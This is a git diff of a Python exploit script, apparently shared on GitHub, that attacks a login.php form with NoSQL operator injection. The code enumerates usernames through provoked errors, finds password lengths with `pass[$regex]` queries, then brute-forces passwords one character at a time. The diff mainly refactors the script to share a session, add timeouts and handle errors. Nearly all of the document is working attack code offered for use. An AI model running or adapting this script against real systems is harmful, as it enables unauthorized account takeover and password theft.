@@ -19,7 +19,7 @@ def build_payload(users) -> str:
     return payload
 
 
-def get_users(ip, seen_users=None) -> list:
+def get_users(session, seen_users=None) -> list:
 
     # random username to provoke an error that will give the first known user
     initial_fake_user = "r4nd0mus3rth4tw0uldpr0b4blyn0t3xist"
@@ -27,20 +27,13 @@ def get_users(ip, seen_users=None) -> list:
     if seen_users is None:
         seen_users = [initial_fake_user]
 
-    session = requests.session()
-    url = f"http://{ip}/login.php"
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": f"http://{ip}",
-        "Referer": f"http://{ip}",
-    }
-
     while True:
 
         data = build_payload(seen_users)
 
-        response = session.post(url, headers=headers, data=data)
+        response = session.post(
+            url=CONFIG["url"], headers=CONFIG["headers"], data=data, timeout=10
+        )
         soup = BeautifulSoup(response.text, "html.parser")
 
         # grabs the username from the response page
@@ -63,50 +56,45 @@ def get_users(ip, seen_users=None) -> list:
     return seen_users
 
 
-def get_pass_length(ip, user, max_length=15):
-    session = requests.session()
-    url = f"http://{ip}/login.php"
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": f"http://{ip}",
-        "Referer": f"http://{ip}",
-    }
-
+def get_pass_length(session, user, max_length=15):
     pass_length = 0
 
     while pass_length < max_length:
 
         # Builds a regular expression like "^.{n}$" n incrementing from 0 to max_length (default : 15)
         data = f"user={user}&pass[$regex]=^.{{{pass_length}}}$&remember=on"
-        response = session.post(url, headers=headers, data=data, allow_redirects=False)
+
+        response = session.post(
+            url=CONFIG["url"],
+            headers=CONFIG["headers"],
+            data=data,
+            timeout=10,
+            allow_redirects=False,
+        )
 
         # Results will bring to an error until the proper length is found
         if response.headers.get("Location") != "/?err=1":
-            print(f"{PURPLE}[+] Password lenght found : {pass_length}{RESET}")
+            print(f"{PURPLE}[+] Password length found : {pass_length}{RESET}")
             return pass_length
 
         else:
             pass_length += 1
 
-    return f"{RED}[-] Password too long (over {max_length} characters){RESET}"
+    print(f"{RED}[-] Password too long (over {max_length} characters){RESET}")
+    return None
 
 
-def get_password(ip, user):
+def get_password(session, user):
 
-    pass_length = get_pass_length(ip, user)
+    pass_length = get_pass_length(session, user)
     char_set = digits + ascii_letters
-
-    session = requests.session()
-    url = f"http://{ip}/login.php"
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": f"http://{ip}",
-        "Referer": f"http://{ip}",
-    }
-
     password = ""
+
+    if pass_length is None:
+        print(
+            f"{RED}[-] Password length not found : can't retrieve the password{RESET}"
+        )
+        return None
 
     for _ in range(pass_length):
 
@@ -118,7 +106,11 @@ def get_password(ip, user):
 
             data = f"user={user}&pass[$regex]=^{attempt}$&remember=on"
             response = session.post(
-                url, headers=headers, data=data, allow_redirects=False
+                url=CONFIG["url"],
+                headers=CONFIG["headers"],
+                data=data,
+                timeout=10,
+                allow_redirects=False,
             )
 
             # if the added character doesn't lead to error page, it's validated
@@ -134,12 +126,42 @@ def get_password(ip, user):
 
 
 if __name__ == "__main__":
+    session = requests.Session()
     ip = input("IP address : ")
-    print(f"User accounts : {get_users(ip)}")
-    while True:
-        user = input("User : ")
-        if user in get_users(ip):
-            get_password(ip, user)
-            print(get_users(ip))
-        else:
-            print(f"{RED}[-] Invalid username{RESET}")
+
+    CONFIG = {
+        "headers": {
+            "User-Agent": "Mozilla/5.0",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": f"http://{ip}",
+            "Referer": f"http://{ip}",
+        },
+        "url": f"http://{ip}/login.php",
+    }
+
+    try:
+        all_users = get_users(session)
+        print(f"Users found: {all_users}")
+
+        while True:
+            user = input("User : ")
+            if user in all_users:
+                get_password(session, user)
+                again = input("Get another user's password ? y/n ")
+
+                if again in ["n", "no"]:
+                    print(
+                        f"\n {RED} --- Bye ! Don't forget to rate the github ;) ---{RESET}"
+                    )
+                    break
+                else:
+                    print(all_users)
+            else:
+                print(f"{RED}[-] Invalid username{RESET}")
+
+    except requests.exceptions.ConnectTimeout:
+        print(f"{RED}[-] Connection timed out. Check the IP or network.{RESET}")
+    except requests.exceptions.ConnectionError:
+        print(f"{RED}[-] Could not connect to the server.{RESET}")
+    except requests.exceptions.RequestException as e:
+        print(f"{RED}[-] An unexpected error occurred: {e}{RESET}")
